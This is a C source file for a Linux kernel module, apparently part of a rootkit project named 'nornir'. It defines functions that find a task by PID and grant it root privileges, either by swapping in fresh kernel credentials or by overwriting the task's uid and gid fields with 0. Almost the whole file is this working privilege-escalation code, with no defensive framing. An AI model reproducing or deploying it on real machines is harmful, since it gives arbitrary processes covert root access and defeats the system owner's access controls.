/**
 * Copyright (c) 2024 arttnba3 <arttnba@gmail.com>
 * 
 * This work is licensed under the terms of the GNU GPL, version 2 or later.
 */

#include <linux/kernel.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/types.h>
#include <linux/pid.h>
#include "common/logger.h"

static __always_inline struct task_struct* nornir_find_root_pcb(void)
{
    struct task_struct *task;

    task = current;
    if (unlikely(task->parent == task)) {
        logger_error("detected out-of-tree task_struct, pid: %d\n", task->pid);
        return NULL;
    }

    do {
        task = task->parent;
    } while (task != task->parent);

    return task;
}

static __always_inline struct task_struct* nornir_find_task_by_pid(pid_t pid)
{
    return pid_task(find_vpid(pid), PIDTYPE_PID);
}

static __maybe_unused void nornir_grant_root_by_cred_replace(pid_t pid)
{
    struct task_struct *task;
    struct cred *old, *new;
    
    task = nornir_find_task_by_pid(pid);
    if (!task) {
        logger_error(
            "Unable to find task_struct of pid %d, root grant failed.\n",
            pid
        );
        return ;
    }

    new = prepare_kernel_cred(task);
    if (!new) {
        logger_error("Unable to allocate new cred, root grant failed.\n");
        return ;
    }

    old = (struct cred*) task->real_cred;

    get_cred(new);
    rcu_assign_pointer(task->real_cred, new);
    rcu_assign_pointer(task->cred, new);

    put_cred(old);
    put_cred(old);

    logger_info("Root privilege has been granted to task %d.\n", pid);
}

static __maybe_unused void nornir_grant_root_by_cred_overwrite(pid_t pid)
{
    struct task_struct *task;
    struct cred *cred;
    
    task = nornir_find_task_by_pid(pid);
    if (!task) {
        logger_error(
            "Unable to find task_struct of pid %d, root grant failed.\n",
            pid
        );
        return ;
    }

    cred = (struct cred*) task->real_cred;
    cred->uid = cred->euid = cred->suid = cred->fsuid = KUIDT_INIT(0);
    cred->gid = cred->egid = cred->sgid = cred->fsgid = KGIDT_INIT(0);

    if (unlikely(task->cred != task->real_cred)) {
        logger_warn("Mismatched cred & real_cred detected for task %d.\n", pid);
        cred = (struct cred*) task->cred;
        cred->uid = cred->euid = cred->suid = cred->fsuid = KUIDT_INIT(0);
        cred->gid = cred->egid = cred->sgid = cred->fsgid = KGIDT_INIT(0);
    }

    logger_info("Root privilege has been granted to task %d.\n", pid);
}
